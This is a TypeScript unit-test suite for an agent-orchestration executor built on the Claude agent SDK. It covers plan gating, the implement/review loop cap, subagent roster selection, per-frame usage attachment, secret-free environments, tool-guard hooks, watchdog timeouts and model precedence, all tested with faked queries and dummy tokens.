import { afterEach, beforeEach, describe, it } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import type { Options as SdkOptions, SDKMessage, HookInput } from "@anthropic-ai/claude-agent-sdk";
import { SdkExecutor, resolveLeadModel, type SdkQueryFn, type SdkExecutorOptions } from "../src/sdk-executor.js";
import { PlanRejectedError, type EmittedMessage, type RunContext } from "../src/executor.js";
import type { PlanVerdict } from "../src/steering.js";
import type { AgentTemplate, ClaimSkill } from "../src/protocol.js";
import { skillsPluginDir } from "../src/skills-plugin.js";
import { nullLogger } from "./helpers.js";

// The SDK executor is exercised only up to — never across — the network boundary:
// `queryFn` is faked, so the plan gate, the implement⇄review loop + cap, follow-up
// injection, guardrails, sparse env, session/resume, and watchdogs are all
// provable with dummy credentials and NO live Anthropic session. The plan/done
// signals are scripted as MCP tool_use blocks the executor observes in the stream.

const OAUTH = "dummy-oauth-token-do-not-scan-0000";
const FAKE_PAT = "dummy-forge-pat-do-not-scan-1111";
const FAKE_JOIN_TOKEN = "dummy-join-token-do-not-scan-2222";

const coder: AgentTemplate = { name: "coder", description: "writes code", prompt_body: "You implement.", tools: ["Read", "Edit", "Write", "Bash"] };
const reviewer: AgentTemplate = { name: "reviewer", description: "reviews", prompt_body: "You review.", tools: ["Read", "Grep"] };
const lead: AgentTemplate = { name: "lead", description: "leads", prompt_body: "LEAD SYSTEM PROMPT", model: "fable" };

// Repo-sourced agents (PRD #37): repoCoder declares WebFetch (honored — the policy
// reversal); repoAuditor declares NO tools (inherit-all, still structurally denied
// Agent); repoLead is a repo file named `lead` (an ordinary subagent, never the
// main-thread orchestrator).
const repoCoder: AgentTemplate = { name: "coder", description: "repo coder", prompt_body: "REPO CODER BODY", tools: ["Read", "Edit", "Bash", "WebFetch"] };
const repoAuditor: AgentTemplate = { name: "auditor", description: "repo auditor", prompt_body: "REPO AUDITOR BODY" };
const repoLead: AgentTemplate = { name: "lead", description: "repo lead", prompt_body: "REPO LEAD BODY" };

/** An approve verdict carrying a resolved selection (as the gate delivers it). */
function approveWith(source: "repo" | "own", exclusions: string[] = []): PlanVerdict {
  return { kind: "approve", selection: { status: "ok", selection: { source, exclusions } } };
}

/** The append text of a lead system prompt (the SDK preset shape). */
function appendOf(systemPrompt: SdkOptions["systemPrompt"]): string {
  return (systemPrompt as { append?: string })?.append ?? "";
}

// --- scripted SDK messages ---------------------------------------------------

function assistantText(text: string, sessionId = "sess-1"): SDKMessage {
  return { type: "assistant", session_id: sessionId, message: { content: [{ type: "text", text }] } } as unknown as SDKMessage;
}
function submitPlan(plan: string, sessionId = "sess-1"): SDKMessage {
  return {
    type: "assistant",
    session_id: sessionId,
    message: { content: [{ type: "tool_use", id: "t1", name: "mcp__uzi__submit_plan", input: { plan_md: plan } }] },
  } as unknown as SDKMessage;
}
function signalDone(sessionId = "sess-1"): SDKMessage {
  return {
    type: "assistant",
    session_id: sessionId,
    message: { content: [{ type: "tool_use", id: "t2", name: "mcp__uzi__signal_done", input: {} }] },
  } as unknown as SDKMessage;
}
function resultSuccess(sessionId = "sess-1"): SDKMessage {
  return { type: "result", subtype: "success", is_error: false, num_turns: 1, session_id: sessionId } as unknown as SDKMessage;
}

type Script = SDKMessage[] | ((signal: AbortSignal) => AsyncIterable<unknown>);

interface Turn {
  options: SdkOptions;
  promptText?: string;
}

/** A fake `query` that replays one scripted stream per turn (invocation). */
function fakeTurns(scripts: Script[]): { queryFn: SdkQueryFn; turns: Turn[] } {
  const turns: Turn[] = [];
  let i = 0;
  const queryFn: SdkQueryFn = (params) => {
    const script = scripts[Math.min(i, scripts.length - 1)]!;
    i++;
    const turn: Turn = { options: params.options };
    turns.push(turn);
    return (async function* () {
      for await (const p of params.prompt) {
        const rec = p as { message?: { content?: unknown } };
        const content = rec.message?.content;
        turn.promptText = typeof content === "string" ? content : JSON.stringify(content);
      }
      const s = typeof script === "function" ? script(params.options.abortController!.signal) : script;
      if (Array.isArray(s)) for (const m of s) yield m;
      else yield* s as AsyncIterable<SDKMessage>;
    })();
  };
  return { queryFn, turns };
}

function hangUntilAbort(signal: AbortSignal): AsyncIterable<unknown> {
  return {
    async *[Symbol.asyncIterator]() {
      await new Promise<void>((resolve) => {
        if (signal.aborted) return resolve();
        // A real hung SDK query has pending network I/O that keeps the event loop
        // alive; the executor's watchdog timers are unref'd, so without a ref'd
        // keep-alive here node 22 drains the loop before the watchdog fires
        // ("event loop has already resolved"). Cleared the moment the watchdog aborts.
        const keepAlive = setInterval(() => {}, 1_000);
        signal.addEventListener(
          "abort",
          () => {
            clearInterval(keepAlive);
            resolve();
          },
          { once: true },
        );
      });
    },
  };
}

let homeDir: string;
let saved: Record<string, string | undefined>;

interface CtxProbe {
  ctx: RunContext;
  emits: EmittedMessage[];
  sessionIds: string[];
  gated: string[];
  iterations: number[];
}

function makeCtx(
  overrides: Partial<RunContext> = {},
  verdict: PlanVerdict = { kind: "approve", selection: { status: "absent" } },
): CtxProbe {
  const emits: EmittedMessage[] = [];
  const sessionIds: string[] = [];
  const gated: string[] = [];
  const iterations: number[] = [];
  const ctx: RunContext = {
    runId: "r1",
    issueIid: 5,
    issueTitle: "Fix login",
    issueDescription: "please implement",
    worktreePath: "/tmp/does-not-need-to-exist",
    branch: "agent/issue-5",
    emit: (m) => emits.push(m),
    oauthToken: OAUTH,
    agents: [],
    config: null,
    sessionId: null,
    onSessionId: (s) => sessionIds.push(s),
    gatePlan: async (planMd) => {
      gated.push(planMd);
      return verdict;
    },
    pullFollowUp: () => undefined,
    reportIteration: (n) => iterations.push(n),
    ...overrides,
  };
  return { ctx, emits, sessionIds, gated, iterations };
}

beforeEach(() => {
  homeDir = fs.mkdtempSync(path.join(os.tmpdir(), "uzi-sdkhome-"));
  saved = { UZI_WORKER_TOKEN: process.env.UZI_WORKER_TOKEN, UZI_FORGE_PAT: process.env.UZI_FORGE_PAT };
  process.env.UZI_WORKER_TOKEN = FAKE_JOIN_TOKEN;
  process.env.UZI_FORGE_PAT = FAKE_PAT;
});

afterEach(() => {
  fs.rmSync(homeDir, { recursive: true, force: true });
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
});

describe("SdkExecutor plan gate", () => {
  it("captures the plan, gates on it, then runs the loop to done and reports the branch", async () => {
    const { queryFn, turns } = fakeTurns([
      [submitPlan("# The Plan\n- step 1"), resultSuccess()], // planning turn
      [assistantText("implementing"), signalDone(), resultSuccess()], // loop turn 1
    ]);
    const probe = makeCtx({ agents: [lead, coder, reviewer] });
    const result = await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx);

    // No repo agents + an absent selection → the run default is the OWN roster
    // (coder, reviewer), reported back for the MR marker (PRD #37).
    // toolEnv is {} here (no tier-1 packages provisioned in this test); it rides the
    // result so the M9 self_improve check runner can put provisioned tools on PATH.
    assert.deepStrictEqual(result, { branch: "agent/issue-5", agentSelection: { source: "own", agents: ["coder", "reviewer"] }, toolEnv: {} });
    assert.deepStrictEqual(probe.gated, ["# The Plan\n- step 1"]); // gate saw the plan
    assert.deepStrictEqual(probe.iterations, [1]); // one loop iteration reported
    assert.strictEqual(turns.length, 2); // exactly one planning + one loop turn
    // The signal tool_use is NOT leaked to the run stream as a raw tool_use.
    assert.ok(!probe.emits.some((m) => m.kind === "tool_use" && m.payload["name"] === "mcp__uzi__submit_plan"));
  });

  it("fails with the user's reason (verbatim) when the plan is rejected", async () => {
    const { queryFn } = fakeTurns([[submitPlan("plan"), resultSuccess()]]);
    const probe = makeCtx({}, { kind: "reject", reason: "not thorough enough" });
    await assert.rejects(
      new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx),
      (err: unknown) => err instanceof PlanRejectedError && err.reason === "not thorough enough",
    );
  });

  it("cancels the run when the gate returns cancel", async () => {
    const { queryFn } = fakeTurns([[submitPlan("plan"), resultSuccess()]]);
    const probe = makeCtx({}, { kind: "cancel" });
    await assert.rejects(new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx), /run cancelled/);
  });

  it("fails when the planning turn ends without a submitted plan", async () => {
    const { queryFn } = fakeTurns([[assistantText("I did nothing"), resultSuccess()]]);
    const probe = makeCtx();
    await assert.rejects(
      new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx),
      /without submitting a plan/,
    );
    assert.deepStrictEqual(probe.gated, []); // gate never reached
  });
});

describe("SdkExecutor agent selection at the gate boundary (PRD #37)", () => {
  /** Run a plan turn + one implement turn under `verdict`, returning the turns. */
  async function runWith(overrides: Partial<RunContext>, verdict: PlanVerdict) {
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [signalDone(), resultSuccess()],
    ]);
    const probe = makeCtx({ agents: [lead, coder, reviewer], ...overrides }, verdict);
    const result = await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx);
    return { turns, probe, result };
  }

  it("repo source: the implement turn runs the repo roster, each with its declared tools", async () => {
    const { turns, result } = await runWith({ repoAgents: [repoCoder, repoAuditor] }, approveWith("repo"));

    // The PLAN turn ran with the OWN roster (Decision 5)...
    assert.deepStrictEqual(Object.keys(turns[0]!.options.agents ?? {}).sort(), ["coder", "reviewer"]);
    // ...the IMPLEMENT turn runs the repo roster.
    const impl = turns[1]!.options;
    assert.deepStrictEqual(Object.keys(impl.agents ?? {}).sort(), ["auditor", "coder"]);
    // The repo coder's declared WebFetch is HONORED (Decision 2, policy reversed).
    assert.ok(impl.agents!.coder!.tools?.includes("WebFetch"), "repo agent keeps its declared WebFetch");
    assert.deepStrictEqual(impl.agents!.coder!.tools, ["Read", "Edit", "Bash", "WebFetch"]);
    // The repo body — not the own coder's — is what runs.
    assert.strictEqual(impl.agents!.coder!.prompt, "REPO CODER BODY");
    // The resolved roster is returned for the MR marker.
    assert.deepStrictEqual(result.agentSelection, { source: "repo", agents: ["coder", "auditor"] });
  });

  it("a repo agent with no tools declared is still denied Agent + the deferral tools (structural)", async () => {
    const { turns } = await runWith({ repoAgents: [repoAuditor] }, approveWith("repo"));
    const impl = turns[1]!.options;
    // No `tools` key → inherit-all, but Agent is denied per-subagent (agents.ts:73)...
    assert.strictEqual(impl.agents!.auditor!.tools, undefined);
    assert.ok(impl.agents!.auditor!.disallowedTools?.includes("Agent"), "Agent denied structurally");
    // ...and the deferral tools stay denied globally on the implement options.
    for (const t of ["ScheduleWakeup", "CronCreate"]) {
      assert.ok((impl.disallowedTools ?? []).includes(t), `${t} denied on the implement turn`);
    }
  });

  it("an excluded agent is absent from the assembled map AND denied by the Agent guard", async () => {
    const { turns } = await runWith({ repoAgents: [repoCoder, repoAuditor] }, approveWith("repo", ["auditor"]));
    const impl = turns[1]!.options;
    assert.deepStrictEqual(Object.keys(impl.agents ?? {}), ["coder"], "excluded auditor is gone");

    const agentHook = impl.hooks!.PreToolUse![2]!.hooks[0]!;
    const denied = await agentHook(
      { hook_event_name: "PreToolUse", tool_name: "Agent", tool_input: { subagent_type: "auditor" } } as unknown as HookInput,
      "tu",
      { signal: new AbortController().signal },
    );
    assert.strictEqual(
      (denied as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision,
      "deny",
      "the excluded agent is denied by the rebuilt Agent guard",
    );
    // The surviving agent is still allowed (guard rebuilt with the new allowSet).
    const allowed = await agentHook(
      { hook_event_name: "PreToolUse", tool_name: "Agent", tool_input: { subagent_type: "coder" } } as unknown as HookInput,
      "tu",
      { signal: new AbortController().signal },
    );
    assert.strictEqual(
      (allowed as { hookSpecificOutput?: { updatedInput?: Record<string, unknown> } }).hookSpecificOutput?.updatedInput?.run_in_background,
      false,
    );
  });

  it("a repo file named `lead` is a subagent, never the main-thread system prompt", async () => {
    const { turns } = await runWith({ repoAgents: [repoCoder, repoLead] }, approveWith("repo"));
    const impl = turns[1]!.options;
    // `lead` is an invokable subagent...
    assert.ok(Object.keys(impl.agents ?? {}).includes("lead"), "repo lead is a subagent");
    assert.strictEqual(impl.agents!.lead!.prompt, "REPO LEAD BODY");
    // ...and the MAIN-THREAD prompt is uzi's builtin lead, NOT the repo lead body.
    const append = appendOf(impl.systemPrompt);
    assert.ok(append.includes("LEAD SYSTEM PROMPT"), "the own builtin lead prompt runs the main thread");
    assert.ok(!append.includes("REPO LEAD BODY"), "the repo lead body never reaches the main-thread prompt");
  });

  it("repo source adds the untrusted-review passage to the lead prompt; own does not", async () => {
    const { turns: repoTurns } = await runWith({ repoAgents: [repoCoder] }, approveWith("repo"));
    assert.ok(appendOf(repoTurns[1]!.options.systemPrompt).includes("UNVERIFIED"), "repo source warns the lead");

    const { turns: ownTurns } = await runWith({}, approveWith("own"));
    assert.ok(!appendOf(ownTurns[1]!.options.systemPrompt).includes("UNVERIFIED"), "own source does not");
  });

  it("the implement prompt names the resolved roster (and the lead-only case says do it yourself)", async () => {
    const { turns: repoTurns } = await runWith({ repoAgents: [repoCoder, repoAuditor] }, approveWith("repo"));
    const prompt = repoTurns[1]!.promptText ?? "";
    assert.ok(prompt.includes("auditor") && prompt.includes("coder"), "prompt names the repo roster");
    assert.ok(!prompt.includes("reviewer"), "the own roster's names do not leak into a repo-source prompt");

    // Excluding every own subagent is a legal lead-only run: the prompt says so.
    const { turns: leadOnly } = await runWith({}, approveWith("own", ["coder", "reviewer"]));
    assert.deepStrictEqual(Object.keys(leadOnly[1]!.options.agents ?? {}), []);
    assert.ok((leadOnly[1]!.promptText ?? "").includes("No subagents are available"), "lead-only prompt renders");
  });

  it("own source reproduces today's roster, minus exclusions", async () => {
    const { turns: full } = await runWith({}, approveWith("own"));
    assert.deepStrictEqual(Object.keys(full[1]!.options.agents ?? {}).sort(), ["coder", "reviewer"]);

    const { turns: trimmed } = await runWith({}, approveWith("own", ["reviewer"]));
    assert.deepStrictEqual(Object.keys(trimmed[1]!.options.agents ?? {}), ["coder"]);
  });

  it("a malformed selection resolves to own, never the repo source", async () => {
    const verdict: PlanVerdict = { kind: "approve", selection: { status: "invalid" } };
    const { turns, probe, result } = await runWith({ repoAgents: [repoCoder, repoAuditor] }, verdict);
    // Even with repo agents present, an invalid selection uses the OWN roster.
    assert.deepStrictEqual(Object.keys(turns[1]!.options.agents ?? {}).sort(), ["coder", "reviewer"]);
    assert.strictEqual(result.agentSelection!.source, "own");
    assert.ok(probe.emits.some((m) => String(m.payload.text ?? "").includes("malformed")), "a note explains the fallback");
  });
});

describe("SdkExecutor implement/review loop", () => {
  it("caps the loop at max_iterations and fails when done is never signalled", async () => {
    // Planning turn, then loop turns that never signal done.
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [assistantText("still working"), resultSuccess()],
    ]);
    const probe = makeCtx({ config: { max_iterations: 3 } });
    await assert.rejects(
      new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx),
      /maximum implement\/review iterations/,
    );
    assert.deepStrictEqual(probe.iterations, [1, 2, 3]); // reported each iteration
    assert.strictEqual(turns.length, 1 /*plan*/ + 3 /*loop*/);
  });

  it("injects a queued follow-up into the next loop turn's prompt", async () => {
    const followUps = ["please also add tests"];
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan"), resultSuccess()], // planning
      [assistantText("first pass"), resultSuccess()], // loop 1 (no done)
      [assistantText("second pass"), signalDone(), resultSuccess()], // loop 2 (done)
    ]);
    const probe = makeCtx({ config: { max_iterations: 5 }, pullFollowUp: () => followUps.shift() });
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx);

    // turns[0] = plan, turns[1] = loop1, turns[2] = loop2 (carries the follow-up).
    assert.match(turns[2]!.promptText ?? "", /please also add tests/);
    assert.match(turns[2]!.promptText ?? "", /UNTRUSTED INPUT/); // framed as data
    assert.doesNotMatch(turns[1]!.promptText ?? "", /please also add tests/);
  });
});

describe("SdkExecutor per-frame usage attach (PRD #40 Decision 11)", () => {
  const USAGE = { input_tokens: 1200, output_tokens: 800, cache_read_input_tokens: 400, cache_creation_input_tokens: 50 };

  /** An assistant frame carrying per-call usage + arbitrary content blocks. */
  function assistantUsage(
    blocks: Array<Record<string, unknown>>,
    usage: Record<string, unknown> = USAGE,
    subagentType?: string,
  ): SDKMessage {
    const msg: Record<string, unknown> = { type: "assistant", session_id: "sess-1", message: { usage, content: blocks } };
    if (subagentType) msg["subagent_type"] = subagentType;
    return msg as unknown as SDKMessage;
  }

  /** Emitted messages that actually carry an attached `usage` payload key. */
  function withUsage(emits: EmittedMessage[]): EmittedMessage[] {
    return emits.filter((m) => m.payload["usage"] !== undefined);
  }

  it("attaches the frame's usage to EXACTLY ONE emitted message (the first surviving block)", async () => {
    // A multi-block frame explodes into thinking + text; usage must land once, on
    // the first — never multiplied across both (which would double the run total).
    const frame = assistantUsage([
      { type: "thinking", thinking: "weighing options" },
      { type: "text", text: "the answer" },
    ]);
    const { queryFn } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [frame, signalDone(), resultSuccess()],
    ]);
    const probe = makeCtx();
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx);

    const carriers = withUsage(probe.emits);
    assert.strictEqual(carriers.length, 1, "usage attaches exactly once per frame");
    assert.strictEqual(carriers[0]!.kind, "thinking", "on the FIRST surviving block");
    assert.deepStrictEqual(carriers[0]!.payload["usage"], USAGE);
  });

  it("signal-first frame: usage skips the filtered signal and lands on the surviving text", async () => {
    // signal_done is the FIRST block and is dropped by the signal filter; the usage
    // must survive on the following text rather than being lost with the signal.
    const frame = assistantUsage([
      { type: "tool_use", id: "t2", name: "mcp__uzi__signal_done", input: {} },
      { type: "text", text: "all done" },
    ]);
    const { queryFn } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [frame, resultSuccess()],
    ]);
    const probe = makeCtx();
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx);

    const carriers = withUsage(probe.emits);
    assert.strictEqual(carriers.length, 1);
    assert.strictEqual(carriers[0]!.kind, "text");
    assert.strictEqual(carriers[0]!.payload["text"], "all done");
    // The signal tool_use itself is never emitted, so it can't carry the usage.
    assert.ok(!probe.emits.some((m) => m.kind === "tool_use" && m.payload["name"] === "mcp__uzi__signal_done"));
  });

  it("signal-only frame: every message is filtered, so the usage is dropped without error", async () => {
    // A terminating frame whose ONLY block is signal_done maps to a single message
    // that the filter drops — the frame's usage is lost (accepted, Decision 11a).
    // The run must still complete cleanly.
    const frame = assistantUsage([{ type: "tool_use", id: "t2", name: "mcp__uzi__signal_done", input: {} }]);
    const { queryFn } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [frame, resultSuccess()],
    ]);
    const probe = makeCtx();
    const result = await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx);

    assert.strictEqual(result.branch, "agent/issue-5");
    assert.strictEqual(withUsage(probe.emits).length, 0, "no message carries the dropped frame's usage");
  });

  it("subagent frame keeps its subagent_type attribution alongside the attached usage", async () => {
    // The lead signals done in its own frame; a subagent's text frame carries usage.
    // Attribution (agent) and usage must both survive on that one message.
    const subFrame = assistantUsage([{ type: "text", text: "reviewed unit A" }], USAGE, "reviewer");
    const { queryFn } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [subFrame, signalDone(), resultSuccess()],
    ]);
    const probe = makeCtx({ agents: [lead, coder, reviewer] });
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx);

    const carriers = withUsage(probe.emits);
    assert.strictEqual(carriers.length, 1);
    assert.strictEqual(carriers[0]!.agent, "reviewer", "subagent_type attribution intact");
    assert.deepStrictEqual(carriers[0]!.payload["usage"], USAGE);
  });

  it("does NOT re-attach on the result frame (result usage travels via mapResult, not this path)", async () => {
    // A success result carrying usage must not get an executor-side attach — that
    // usage is already in the status payload from mapResult, and double-emitting
    // would let the client per-agent sum absorb a cumulative result total.
    const resultWithUsage = {
      type: "result", subtype: "success", is_error: false, num_turns: 1, session_id: "sess-1", usage: USAGE,
    } as unknown as SDKMessage;
    const { queryFn } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [signalDone(), resultWithUsage],
    ]);
    const probe = makeCtx();
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx);

    // The result usage rides the status payload (event: "result"), and NO
    // assistant-style attach happened (signal_done was the only assistant block).
    const statusWithUsage = probe.emits.filter(
      (m) => m.kind === "status" && m.payload["event"] === "result" && m.payload["usage"] !== undefined,
    );
    assert.strictEqual(statusWithUsage.length, 1, "result usage is on the status frame");
    assert.ok(
      !probe.emits.some((m) => m.kind !== "status" && m.payload["usage"] !== undefined),
      "no non-status message got an executor-side attach from the result frame",
    );
  });
});

describe("SdkExecutor guardrail options", () => {
  it("wires the signal MCP server, the subagent guard, and the file/bash hooks", async () => {
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [signalDone(), resultSuccess()],
    ]);
    const probe = makeCtx({ agents: [lead, coder, reviewer] });
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx);

    const o = turns[0]!.options;
    assert.strictEqual(o.permissionMode, "bypassPermissions");
    assert.deepStrictEqual(o.settingSources, []);
    assert.ok(o.mcpServers && "uzi" in o.mcpServers, "signal MCP server wired");
    assert.deepStrictEqual(Object.keys(o.agents ?? {}).sort(), ["coder", "reviewer"]);
    assert.strictEqual(o.model, "fable");

    // The deferral tools are blocked so the lead can't background work to a future
    // turn the per-turn reap would only wake to a killed subagent (#34).
    for (const t of ["ScheduleWakeup", "CronCreate"]) {
      assert.ok((o.disallowedTools ?? []).includes(t), `${t} must be disallowed`);
    }

    // Three PreToolUse matchers: Bash, the file tools, and the Agent guard.
    const matchers = (o.hooks?.PreToolUse ?? []).map((m) => m.matcher);
    assert.deepStrictEqual(matchers, ["Bash", "Read|Edit|Write|MultiEdit|NotebookEdit|Glob|Grep", "Agent"]);

    // The Agent guard denies a subagent not in the assembled map (item 7).
    const agentHook = o.hooks!.PreToolUse![2]!.hooks[0]!;
    const denied = await agentHook(
      { hook_event_name: "PreToolUse", tool_name: "Agent", tool_input: { subagent_type: "general-purpose" } } as unknown as HookInput,
      "tu",
      { signal: new AbortController().signal },
    );
    assert.strictEqual((denied as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision, "deny");
    // ...but allows an assembled subagent, forcing it to run synchronously (#34).
    const allowed = await agentHook(
      { hook_event_name: "PreToolUse", tool_name: "Agent", tool_input: { subagent_type: "coder" } } as unknown as HookInput,
      "tu",
      { signal: new AbortController().signal },
    );
    assert.strictEqual(
      (allowed as { hookSpecificOutput?: { updatedInput?: Record<string, unknown> } }).hookSpecificOutput?.updatedInput?.run_in_background,
      false,
    );
  });

  it("hands the SDK a sparse env with no worker secrets (every turn)", async () => {
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [signalDone(), resultSuccess()],
    ]);
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(makeCtx().ctx);

    for (const t of turns) {
      const env = t.options.env!;
      assert.deepStrictEqual(
        new Set(Object.keys(env)),
        new Set(["CLAUDE_CODE_OAUTH_TOKEN", "HOME", "PATH", "ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN"]),
      );
      const serialized = JSON.stringify(env);
      assert.ok(!serialized.includes(FAKE_PAT), "PAT must not reach the SDK env");
      assert.ok(!serialized.includes(FAKE_JOIN_TOKEN), "join token must not reach the SDK env");
    }
  });

  it("resumes the session across turns, seeding from the claim's session id", async () => {
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan", "sess-A"), resultSuccess("sess-A")],
      [signalDone("sess-A"), resultSuccess("sess-A")],
    ]);
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(makeCtx({ sessionId: "prev-session" }).ctx);
    // Planning turn resumes the claim's session; the loop turn resumes the SDK's.
    assert.strictEqual(turns[0]!.options.resume, "prev-session");
    assert.strictEqual(turns[1]!.options.resume, "sess-A");
  });
});

describe("SdkExecutor agent-tree reap (B1)", () => {
  // A query that, per turn, simulates the SDK spawning the CLI (so a pid is
  // tracked) before replaying its script.
  function spawningQuery(scripts: SDKMessage[][]): SdkQueryFn {
    let i = 0;
    return (params) => {
      const script = scripts[Math.min(i, scripts.length - 1)]!;
      i++;
      return (async function* () {
        params.options.spawnClaudeCodeProcess?.({ command: "x", args: [] } as never);
        for await (const _ of params.prompt) { /* drain */ }
        for (const m of script) yield m;
      })();
    };
  }

  it("group-kills every spawned agent subprocess on the DONE path (not just on a trip)", async () => {
    const killed: (number | undefined)[] = [];
    let pid = 5000;
    const exec = new SdkExecutor(nullLogger(), homeDir, {
      queryFn: spawningQuery([[submitPlan("plan"), resultSuccess()], [signalDone(), resultSuccess()]]),
      spawn: () => ({ pid: ++pid }),
      kill: (p) => (killed.push(p), true),
    });
    await exec.run(makeCtx().ctx);
    // Both turns' pids were reaped when the run finished its DONE path.
    assert.deepStrictEqual([...killed].sort(), [5001, 5002]);
    // Idempotent: a second reap does nothing (the set was cleared → no recycled-pid kill).
    killed.length = 0;
    exec.killAgentTree();
    assert.deepStrictEqual(killed, []);
  });

  it("reaps the agent subprocess even on a failure path (no plan submitted)", async () => {
    const killed: (number | undefined)[] = [];
    const exec = new SdkExecutor(nullLogger(), homeDir, {
      queryFn: spawningQuery([[assistantText("nothing"), resultSuccess()]]),
      spawn: () => ({ pid: 6001 }),
      kill: (p) => (killed.push(p), true),
    });
    await assert.rejects(exec.run(makeCtx().ctx), /without submitting a plan/);
    assert.deepStrictEqual(killed, [6001]);
  });
});

describe("SdkExecutor failure + watchdog paths", () => {
  it("fails fast when no OAuth token is present", async () => {
    const { queryFn } = fakeTurns([[resultSuccess()]]);
    await assert.rejects(
      new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(makeCtx({ oauthToken: undefined }).ctx),
      /no Anthropic OAuth token/,
    );
  });

  it("fails when the planning turn ends in an error result", async () => {
    const script: SDKMessage[] = [
      { type: "result", subtype: "error_max_turns", is_error: true, errors: ["cap"], session_id: "s" } as unknown as SDKMessage,
    ];
    const { queryFn } = fakeTurns([script]);
    await assert.rejects(
      new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(makeCtx().ctx),
      /agent run failed: error_max_turns/,
    );
  });

  it("trips the idle watchdog on a silent agent and aborts the SDK", async () => {
    const { queryFn, turns } = fakeTurns([(signal) => hangUntilAbort(signal)]);
    const probe = makeCtx({ config: { idle_timeout_seconds: 0.03, run_timeout_seconds: 100 } });
    await assert.rejects(new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx), /idle timeout/);
    assert.strictEqual(turns[0]!.options.abortController!.signal.aborted, true);
  });

  it("trips the wall-clock watchdog even while the agent is active and aborts", async () => {
    const script = (signal: AbortSignal): AsyncIterable<unknown> => ({
      async *[Symbol.asyncIterator]() {
        yield assistantText("working");
        yield* hangUntilAbort(signal);
      },
    });
    const { queryFn } = fakeTurns([script]);
    const probe = makeCtx({ config: { idle_timeout_seconds: 100, run_timeout_seconds: 0.03 } });
    await assert.rejects(new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx), /wall-clock timeout/);
  });

  it("cancels via an external abort signal (before the gate)", async () => {
    const controller = new AbortController();
    controller.abort();
    const { queryFn } = fakeTurns([(signal) => hangUntilAbort(signal)]);
    await assert.rejects(
      new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(makeCtx({ signal: controller.signal }).ctx),
      /run cancelled/,
    );
  });
});

describe("resolveLeadModel (PRD #17 precedence)", () => {
  it("prefers the run owner's per-user default over the lead template model", () => {
    assert.strictEqual(resolveLeadModel("sonnet", "fable"), "sonnet");
  });
  it("falls back to the lead template model when there is no per-user default", () => {
    assert.strictEqual(resolveLeadModel(undefined, "fable"), "fable");
  });
  it("uses the per-user default when the lead template has no model", () => {
    assert.strictEqual(resolveLeadModel("sonnet", undefined), "sonnet");
  });
  it("falls back to the template when the config model is a blank string (|| not ??)", () => {
    // The server sends NULL (omitted) for an unset default, never "", but the
    // resolver must be correct in isolation: an empty config must not blank out
    // the template model.
    assert.strictEqual(resolveLeadModel("", "fable"), "fable");
  });
  it("returns undefined (omit the key) when neither is set", () => {
    assert.strictEqual(resolveLeadModel(undefined, undefined), undefined);
    assert.strictEqual(resolveLeadModel("", ""), undefined);
    assert.strictEqual(resolveLeadModel("", undefined), undefined);
  });
});

describe("SdkExecutor model precedence on baseOptions", () => {
  // The resolved model must land on options.model exactly per precedence, and an
  // unset model must OMIT the key (never `model: undefined`) so the SDK/account
  // default applies.
  async function modelForRun(overrides: Partial<RunContext>): Promise<string | undefined> {
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [signalDone(), resultSuccess()],
    ]);
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(makeCtx(overrides).ctx);
    return turns[0]!.options.model;
  }

  it("user default wins over the lead template model", async () => {
    assert.strictEqual(await modelForRun({ agents: [lead], config: { default_model: "sonnet" } }), "sonnet");
  });

  it("lead template model applies when the user has no default", async () => {
    assert.strictEqual(await modelForRun({ agents: [lead], config: null }), "fable");
  });

  it("user default applies even with no lead template model", async () => {
    assert.strictEqual(await modelForRun({ agents: [coder], config: { default_model: "haiku" } }), "haiku");
  });

  it("omits model entirely when neither is set", async () => {
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [signalDone(), resultSuccess()],
    ]);
    await new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(makeCtx({ agents: [coder], config: null }).ctx);
    const o = turns[0]!.options;
    assert.strictEqual(o.model, undefined);
    assert.ok(!("model" in o), "model key must be omitted, not set to undefined");
  });
});

